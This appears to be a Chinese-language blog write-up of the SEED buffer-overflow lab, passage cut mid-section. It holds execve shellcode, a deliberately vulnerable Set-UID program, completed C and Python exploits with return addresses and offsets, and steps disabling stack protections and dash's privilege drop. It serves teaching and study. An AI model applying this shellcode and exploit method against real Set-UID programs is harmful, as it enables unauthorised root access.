Stack</h4><ul><li><p>Ubuntu过去允许可执行堆栈，但现在已经改变了:程序(和共享库)的二进制映像必须声明它们是否需要可执行堆栈，也就是说，它们需要在程序头中标记一个字段。内核或动态连接器使用此标记来决定是否使运行中的程序的堆栈为可执行的或不可执行的。这个标记是由gcc的最新版本自动完成的，默认情况下，堆栈被设置为不可执行的。</p></li><li><p>要改变这种情况，请在编译程序时使用以下选项:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">For executable stack:<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -z execstack -o <span class="hljs-built_in">test</span> test.c</span><br>For non-executable stack:<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -z noexecstack -o <span class="hljs-built_in">test</span> test.c</span><br></code></pre></div></td></tr></table></figure></li></ul><h4 id="配置-bin-sh-仅适用于Ubuntu-16-04虚拟机"><a href="#配置-bin-sh-仅适用于Ubuntu-16-04虚拟机" class="headerlink" title="配置/bin/sh(仅适用于Ubuntu 16.04虚拟机)"></a>配置/bin/sh(仅适用于Ubuntu 16.04虚拟机)</h4><ul><li><p>在Ubuntu 12.04和Ubuntu 16.04虚拟机中，<code>/bin/sh</code>符号链接指向<code>/bin/dash</code> shell。然而，这两个虚拟机中的dash程序有一个重要的区别。</p></li><li><p>Ubuntu 16.04中的<code>dash</code> shell有一个对策，防止它在Set-UID进程中被执行。基本上，如果<code>dash</code>检测到它是在Set-UID进程中执行的，它会立即将有效用户ID更改为进程的真实用户ID，本质上是删除特权。Ubuntu 12.04中的<code>dash</code>程序没有这种行为。</p></li><li><p>由于我们的受害者程序是一个Set-UID程序，并且我们的攻击依赖于运行<code>/bin/sh</code>， <code>/bin/dash</code>中的对策使我们的攻击更加困难。</p></li><li><p>因此，我们将把<code>/bin/sh</code>链接到另一个没有这种对策的shell(在后面的任务中，我们将说明，只要多做一点努力，<code>/bin/dash</code>中的对策就可以很容易地被击败)。</p></li><li><p>我们在Ubuntu 16.04虚拟机中安装了一个名为<code>zsh</code>的shell程序。我们使用以下命令将<code>/bin/sh</code>链接到<code>zsh</code>(在Ubuntu 12.04中不需要这样做)：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">ln</span> -sf /bin/zsh /bin/sh</span><br></code></pre></div></td></tr></table></figure></li></ul><p><strong>实验操作</strong></p><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120160147224.png" alt="image-20211120160147224"></p><h3 id="2-2-任务1：运行Shellcode"><a href="#2-2-任务1：运行Shellcode" class="headerlink" title="2.2 任务1：运行Shellcode"></a>2.2 任务1：运行Shellcode</h3><ul><li><p>在开始攻击之前，让我们先熟悉一下<code>shellcode</code>。<code>shellcode</code>是启动shell的代码。它必须被加载到内存中这样我们才能迫使易受攻击的程序跳转到内存中。</p></li><li><p>考虑以下程序:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> *name[<span class="hljs-number">2</span>];<br>name[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>name[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br>execve(name[<span class="hljs-number">0</span>], name, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>我们使用的shellcode只是上面程序的汇编版本。</p></li><li><p>下面的程序演示了如何通过执行存储在缓冲区中的shellcode来启动shell。</p></li><li><p>请编译并运行以下代码，看看是否调用了shell。你可以从网站上下载这个程序。如果您对编写自己的shellcode感兴趣，我们有一个单独的SEED实验。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* call_shellcode.c  */</span><br><br><span class="hljs-comment">/*A program that creates a file containing code for launching shell*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> code[] =<br>  <span class="hljs-string">&quot;\x31\xc0&quot;</span>             <span class="hljs-comment">/* xorl    %eax,%eax              */</span><br>  <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>  <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span>           <span class="hljs-comment">/* pushl   $0x68732f2f            */</span><br>  <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span>           <span class="hljs-comment">/* pushl   $0x6e69622f            */</span><br>  <span class="hljs-string">&quot;\x89\xe3&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ebx              */</span><br>  <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>  <span class="hljs-string">&quot;\x53&quot;</span>                 <span class="hljs-comment">/* pushl   %ebx                   */</span><br>  <span class="hljs-string">&quot;\x89\xe1&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ecx              */</span><br>  <span class="hljs-string">&quot;\x99&quot;</span>                 <span class="hljs-comment">/* cdq                            */</span><br>  <span class="hljs-string">&quot;\xb0\x0b&quot;</span>             <span class="hljs-comment">/* movb    $0x0b,%al              */</span><br>  <span class="hljs-string">&quot;\xcd\x80&quot;</span>             <span class="hljs-comment">/* int     $0x80                  */</span><br>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>   <span class="hljs-type">char</span> buf[<span class="hljs-keyword">sizeof</span>(code)];<br>   <span class="hljs-built_in">strcpy</span>(buf, code);<br>   ((<span class="hljs-type">void</span>(*)( ))buf)( );<br>&#125; <br></code></pre></div></td></tr></table></figure><ul><li>使用下面的<code>gcc</code>命令编译上面的代码。运行程序并描述您的观察结果。请不要忘记使用<code>execstack</code>选项，它允许从堆栈执行代码；如果没有这个选项，程序将会失败。</li></ul></li></ul><h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a><strong>实验过程</strong></h4><p>  <img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120161107619.png" alt="image-20211120161107619"></p><ul><li><p>上面的<code>shellcode</code>调用<code>execve()</code>系统调用来执行<code>/bin/sh</code>。在这个<code>shellcode</code>中有几个地方值得一提。</p></li><li><p>首先，第三条指令将” <code>//sh</code> “而不是”<code>/sh</code> “推入堆栈。这是因为我们需要一个32位的数字，而“/sh”只有24位。幸运的是，” // “等价于” / “，所以我们可以使用双斜杠符号。</p></li><li><p>其次，在调用<code>execve()</code>系统调用之前，我们需要将<code>name[0]</code>(字符串的地址)、<code>name</code>(数组的地址)和NULL分别存储到<code>%ebx</code>、<code>%ecx</code>和<code>%edx</code>寄存器中。第5行存储<code>name[0]</code>到<code>%ebx</code>；第8行存储<code>name</code>到<code>%ecx</code>；第9行设置<code>%edx</code>为零。</p></li><li><p>还有其他方法设置<code>%edx</code>为零(例如，<code>xorl %edx,%edx</code>)；这里使用的(<code>cdq</code>)只是一条更短的指令：它将<code>EAX</code>寄存器(此时为0)中的值的符号(第31位)复制到EDX寄存器的每个位的位置，基本上将<code>%edx</code>设置为0。</p></li><li><p>第三，当我们将<code>%al</code>设置为11，并执行“<code>int $0x80</code>”时，系统调用<code>execve()</code>。</p></li></ul><h3 id="2-3-易受攻击的程序"><a href="#2-3-易受攻击的程序" class="headerlink" title="2.3 易受攻击的程序"></a>2.3 易受攻击的程序</h3><ul><li><p>将向您提供以下程序，该程序第①行中存在缓冲区溢出漏洞。您的任务是利用此漏洞并获得根权限。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Vunlerable program: stack.c */</span><br><span class="hljs-comment">/* You can get this program from the lab&#x27;s website */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-comment">/* Changing this size will change the layout of the stack.</span><br><span class="hljs-comment"> * Instructors can change this value each year, so students</span><br><span class="hljs-comment"> * won&#x27;t be able to use the solutions from the past.</span><br><span class="hljs-comment"> * Suggested value: between 0 and 400  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> BUF_SIZE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUF_SIZE 24</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">bof</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[BUF_SIZE];<br><br>    <span class="hljs-comment">/* The following statement has a buffer overflow problem */</span><br>    <span class="hljs-built_in">strcpy</span>(buffer, str);       <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br><br>     <span class="hljs-comment">/* Change the size of the dummy array to randomize the parameters</span><br><span class="hljs-comment">       for this lab. Need to use the array at least once */</span><br>    <span class="hljs-type">char</span> dummy[BUF_SIZE];  <span class="hljs-built_in">memset</span>(dummy, <span class="hljs-number">0</span>, BUF_SIZE);<br><br>    badfile = fopen(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    fread(str, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">517</span>, badfile);<br>    bof(str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Returned Properly\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>上述程序存在缓冲区溢出漏洞。它首先从名为<code>badfile</code>的文件中读取输入，然后将该输入传递到函数<code>bof()</code>中的另一个缓冲区。原始输入的最大长度可以是517字节，但<code>bof()</code>中的缓冲区长度仅为<code>BUF_SIZE</code>字节，小于517字节。因为<code>strcpy()</code>不检查边界，所以会发生缓冲区溢出。由于此程序是<code>root</code>所有的<code>Set-UID</code>程序，如果普通用户可以利用此缓冲区溢出漏洞进行攻击，则用户可能能够获得<code>root shell</code>。应该注意的是，程序从一个名为<code>badfile</code>的文件获取输入。此文件由用户控制。现在，我们的目标是为<code>badfile</code>创建内容，这样当易受攻击的程序将内容复制到其缓冲区时，就可以生成一个<code>root shell</code>。</li></ul></li></ul><h4 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h4><ul><li>要编译上述易受攻击的程序，不要忘记使用<code>-fno-stack-protector</code>和<code>-z execstack</code>选项关闭<code>StackGuard</code>和非可执行堆栈保护。</li><li>编译之后，我们需要使程序成为根拥有的Set-UID程序。我们可以通过首先将程序的所有权更改为root(行①)，然后将权限更改为4755以启用Set-UID位(行②)来实现这一点。需要注意的是，所有权的变更必须在开启Set-UID位之前完成，因为所有权的变更会导致Set-UID位被关闭。</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">// Note: N should be replaced by the value set by the instructor<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -DBUF_SIZE=N -o stack -z execstack -fno-stack-protector stack.c</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chown</span> root stack ①</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">chmod</span> 4755 stack ②</span><br></code></pre></div></td></tr></table></figure><h3 id="2-4-任务2：利用漏洞"><a href="#2-4-任务2：利用漏洞" class="headerlink" title="2.4 任务2：利用漏洞"></a>2.4 任务2：利用漏洞</h3><ul><li>我们为您提供一个部分完成的exploit代码，称为<code>exploit.c</code>。这段代码的目的是为<code>badfile</code>构造内容。在这个代码中，shellcode是给你的。你需要开发剩下的部分。</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* exploit.c  */</span><br><br><span class="hljs-comment">/* A program that creates a file containing code for launching shell*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">char</span> shellcode[]=<br>    <span class="hljs-string">&quot;\x31\xc0&quot;</span>             <span class="hljs-comment">/* xorl    %eax,%eax              */</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span>           <span class="hljs-comment">/* pushl   $0x68732f2f            */</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span>           <span class="hljs-comment">/* pushl   $0x6e69622f            */</span><br>    <span class="hljs-string">&quot;\x89\xe3&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ebx              */</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                 <span class="hljs-comment">/* pushl   %eax                   */</span><br>    <span class="hljs-string">&quot;\x53&quot;</span>                 <span class="hljs-comment">/* pushl   %ebx                   */</span><br>    <span class="hljs-string">&quot;\x89\xe1&quot;</span>             <span class="hljs-comment">/* movl    %esp,%ecx              */</span><br>    <span class="hljs-string">&quot;\x99&quot;</span>                 <span class="hljs-comment">/* cdq                            */</span><br>    <span class="hljs-string">&quot;\xb0\x0b&quot;</span>             <span class="hljs-comment">/* movb    $0x0b,%al              */</span><br>    <span class="hljs-string">&quot;\xcd\x80&quot;</span>             <span class="hljs-comment">/* int     $0x80                  */</span><br>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br><br>    <span class="hljs-comment">/* Initialize buffer with 0x90 (NOP instruction) */</span><br>    <span class="hljs-built_in">memset</span>(&amp;buffer, <span class="hljs-number">0x90</span>, <span class="hljs-number">517</span>);<br><br>    <span class="hljs-comment">/* You need to fill the buffer with appropriate contents here */</span> <br>    <span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(shellcode);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>    &#123;<br>        buffer[<span class="hljs-number">517</span>-len+i]=shellcode[i];<br>    &#125;<br>    <span class="hljs-comment">//计算返回地址</span><br>    <span class="hljs-type">int</span> ret=<span class="hljs-number">0xbfffeae8</span>+<span class="hljs-number">517</span>-len;<br><span class="hljs-comment">//修改返回地址（小端法）</span><br>    buffer[<span class="hljs-number">0xbfffeb08</span><span class="hljs-number">-0xbfffeae8</span>+<span class="hljs-number">4</span>]=ret&amp;<span class="hljs-number">0xff</span>;<br>    buffer[<span class="hljs-number">0xbfffeb08</span><span class="hljs-number">-0xbfffeae8</span>+<span class="hljs-number">5</span>]=(ret&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span>;<br>    buffer[<span class="hljs-number">0xbfffeb08</span><span class="hljs-number">-0xbfffeae8</span>+<span class="hljs-number">6</span>]=(ret&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span>;<br>    buffer[<span class="hljs-number">0xbfffeb08</span><span class="hljs-number">-0xbfffeae8</span>+<span class="hljs-number">7</span>]=(ret&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span>;<br>    <span class="hljs-comment">/* Save the contents to the file &quot;badfile&quot; */</span><br>    badfile = fopen(<span class="hljs-string">&quot;./badfile&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    fwrite(buffer, <span class="hljs-number">517</span>, <span class="hljs-number">1</span>, badfile);<br>    fclose(badfile);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>完成上述程序后，编译并运行它。这将生成<code>badfile</code>的内容。然后运行易受攻击的程序堆栈。如果你的漏洞实现正确，你应该能够得到一个<code>root shell</code>:</li><li>重要提示：请先编译您的易受攻击的程序。请注意，可以在启用默认<code>StackGuard</code>保护的情况下编译生成<code>badfile</code>的<code>exploit.c</code>程序。这是因为我们不会使程序中的缓冲区溢出。我们将溢出<code>stack.c</code>中的缓冲区，这是在禁用了<code>StackGuard</code>保护的情况下编译的。</li></ul><h4 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h4><ul><li><p>修改<code>stack.c</code>，使<code>BUF_SIZE</code>为24。</p><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120172721636.png" alt="image-20211120172721636"></p></li><li><p>关闭保护机制后，使用<code>-g</code>选项编译<code>stack.c</code>，进行<code>gdb</code>调试。</p></li></ul><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120181140321.png" alt="image-20211120181140321"></p><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120190221824.png" alt="image-20211120190221824"></p><ul><li>得到调用<code>bof()</code>后<code>ebp</code>的地址为<code>0xbfffeb08</code>，<code>buffer</code>首地址为<code>0xbfffeae8</code>。</li><li><p>经过测试，若新的返回地址不是恶意代码的起始地址，（可能因为nop）在执行时产生段错误！（在gdb中可以正常运行）</p></li><li><p>将以下部分用以补全<code>exploit.c</code></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">   <span class="hljs-type">int</span> len=<span class="hljs-built_in">strlen</span>(shellcode);<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>   &#123;<br>       buffer[<span class="hljs-number">517</span>-len+i]=shellcode[i];<br>   &#125;<br>   <span class="hljs-comment">//计算返回地址</span><br>   <span class="hljs-type">int</span> ret=<span class="hljs-number">0xbfffeae8</span>+<span class="hljs-number">517</span>-len;<br><span class="hljs-comment">//修改返回地址（小端法）</span><br>   buffer[<span class="hljs-number">0xbfffeb08</span><span class="hljs-number">-0xbfffeae8</span>+<span class="hljs-number">4</span>]=ret&amp;<span class="hljs-number">0xff</span>;<br>   buffer[<span class="hljs-number">0xbfffeb08</span><span class="hljs-number">-0xbfffeae8</span>+<span class="hljs-number">5</span>]=(ret&gt;&gt;<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xff</span>;<br>   buffer[<span class="hljs-number">0xbfffeb08</span><span class="hljs-number">-0xbfffeae8</span>+<span class="hljs-number">6</span>]=(ret&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xff</span>;<br>   buffer[<span class="hljs-number">0xbfffeb08</span><span class="hljs-number">-0xbfffeae8</span>+<span class="hljs-number">7</span>]=(ret&gt;&gt;<span class="hljs-number">24</span>)&amp;<span class="hljs-number">0xff</span>;<br></code></pre></div></td></tr></table></figure></li><li><p>编译<code>stack.c</code>和<code>exploit.c</code>，将<code>stack</code>设置为Set-UID程序。运行可执行程序：</p><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120193524595.png" alt="image-20211120193524595"></p></li><li><p>用python生成badfile：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>shellcode= (<br>   <span class="hljs-string">&quot;\x31\xc0&quot;</span>    <span class="hljs-comment"># xorl    %eax,%eax</span><br>   <span class="hljs-string">&quot;\x50&quot;</span>        <span class="hljs-comment"># pushl   %eax</span><br>   <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span>  <span class="hljs-comment"># pushl   $0x68732f2f</span><br>   <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span>  <span class="hljs-comment"># pushl   $0x6e69622f</span><br>   <span class="hljs-string">&quot;\x89\xe3&quot;</span>    <span class="hljs-comment"># movl    %esp,%ebx</span><br>   <span class="hljs-string">&quot;\x50&quot;</span>        <span class="hljs-comment"># pushl   %eax</span><br>   <span class="hljs-string">&quot;\x53&quot;</span>        <span class="hljs-comment"># pushl   %ebx</span><br>   <span class="hljs-string">&quot;\x89\xe1&quot;</span>    <span class="hljs-comment"># movl    %esp,%ecx</span><br>   <span class="hljs-string">&quot;\x99&quot;</span>        <span class="hljs-comment"># cdq</span><br>   <span class="hljs-string">&quot;\xb0\x0b&quot;</span>    <span class="hljs-comment"># movb    $0x0b,%al</span><br>   <span class="hljs-string">&quot;\xcd\x80&quot;</span>    <span class="hljs-comment"># int     $0x80</span><br>).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br><br><span class="hljs-comment"># Fill the content with NOP&#x27;s</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">517</span>)) <br><br><span class="hljs-comment"># Put the shellcode at the end</span><br>start = <span class="hljs-number">517</span> - <span class="hljs-built_in">len</span>(shellcode) <br>content[start:] = shellcode<br><br><span class="hljs-comment">##################################################################</span><br>ret    = <span class="hljs-number">0xbfffeae8</span>+<span class="hljs-number">517</span>-<span class="hljs-built_in">len</span>(shellcode)    <span class="hljs-comment"># replace 0xAABBCCDD with the correct value</span><br>offset = <span class="hljs-number">0x24</span>            <span class="hljs-comment"># replace 0 with the correct value</span><br><br>content[offset:offset + <span class="hljs-number">4</span>] = (ret).to_bytes(<span class="hljs-number">4</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) <br><span class="hljs-comment">##################################################################</span><br><br><span class="hljs-comment"># Write the content to a file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/20/Buffer-Overflow_Vulnerability_Lab/image-20211120193648209.png" alt="image-20211120193648209"></p></li></ul><h3 id="2-5-任务3：击败dash的对策"><a href="#2-5-任务3：击败dash的对策" class="headerlink" title="2.5 任务3：击败dash的对策"></a>2.5 任务3：击败dash的对策</h3><ul><li>正如我们之前解释过的，当Ubuntu 16.04中的<code>dash shell</code>检测到有效的UID不等于真正的UID时，它会删除权限。</li><li>这可以从dash程序的更新日志中观察到。我们可以在Line①中看到一个额外的检查，它比较真实和有效的用户/组id。</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// https://launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gz</span><br><span class="hljs-comment">// main() function in main.c has following changes:</span><br>++ uid = getuid();<br>++ gid = getgid();<br>++ <span class="hljs-comment">/*</span><br><span class="hljs-comment">++ * To limit bogus system(3) or popen(3) calls in setuid binaries,</span><br><span class="hljs-comment">++ * require -p flag to work in this situation.</span><br><span class="hljs-comment">++ */</span><br>++ <span class="hljs-keyword">if</span> (!pflag &amp;&amp; (uid != geteuid() || gid != getegid())) &#123; À<br>++ setuid(uid);<br>++ setgid(gid);<br>++ <span class="hljs-comment">/* PS1 might need to be changed accordingly. */</span><br>++ choose_ps1();<br>++ 